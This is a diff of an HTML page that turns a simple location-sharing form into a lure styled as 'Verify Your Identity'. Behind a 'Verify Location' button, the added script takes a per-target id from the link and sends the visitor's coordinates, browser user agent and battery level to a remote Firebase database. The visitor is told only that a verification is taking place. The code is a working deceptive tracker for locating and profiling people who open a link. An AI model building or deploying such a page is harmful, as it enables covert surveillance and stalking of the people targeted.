@@ -1,37 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Location Capture</title>
+<meta charset="UTF-8">
+<title>Location Verification</title>
+<style>
+body {
+    margin: 0; 
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: url('https://images.unsplash.com/photo-1526401485004-2fda9f1d5f3c?blur=55') center/cover no-repeat;
+    backdrop-filter: blur(10px);
+    font-family: Poppins;
+}
+
+.card {
+    background: rgba(255,255,255,0.12);
+    padding: 30px;
+    width: 380px;
+    border-radius: 20px;
+    text-align: center;
+    color: white;
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(255,255,255,0.15);
+}
+
+button {
+    padding: 12px 20px;
+    background: #00e5ff;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+}
+</style>
 </head>
+
 <body>
-  <h2>Click to Share Location</h2>
-  <button onclick="getLocation()">Send Location</button>
 
-  <script type="module" src="firebase.js"></script>
+<div class="card">
+    <h2>Verify Your Identity</h2>
+    <p>Tap the button below to verify your location.</p>
+    <button onclick="capture()">Verify Location</button>
+</div>
 
-  <script type="module">
-    import { db } from './firebase.js';
-    import { ref, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+<script type="module">
+import { db } from './firebase.js';
+import { ref, set } from 
+"https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(saveLocation);
-      } else {
-        alert("Location not supported.");
-      }
-    }
+async function capture() {
+    const id = new URLSearchParams(window.location.search).get("id");
 
-    function saveLocation(position) {
-      const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        time: new Date().toISOString()
-      };
+    if (!id) return alert("Invalid link!");
 
-      set(ref(db, 'locations/user1'), data)
-      .then(() => alert("Location Sent Successfully!"))
-      .catch(err => console.error(err));
-    }
-  </script>
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        let batteryLevel = "Unknown";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryLevel = (b.level * 100) + "%";
+        }
+
+        const data = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            userAgent: navigator.userAgent,
+            battery: batteryLevel,
+            time: new Date().toLocaleString(),
+        };
+
+        await set(ref(db, "locations/" + id), data);
+        alert("Location Verified Successfully!");
+    });
+}
+</script>
+
 </body>
 </html>
